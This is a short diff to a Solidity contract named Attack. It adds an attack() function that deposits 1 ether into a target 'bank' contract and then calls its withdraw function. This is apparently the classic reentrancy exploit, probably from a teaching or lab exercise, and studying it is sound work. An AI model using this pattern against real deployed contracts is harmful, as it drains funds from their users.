@@ -27,4 +27,11 @@ contract Attack{
             bank.withdrow();
         }
     }
+
+    function attack() external payable {
+        require(msg.value == 1 ether,"Require 1 Eth to attack");
+        bank.deposit{value: 1 ether}();
+        bank.withdrow();
+    }
+    
 }
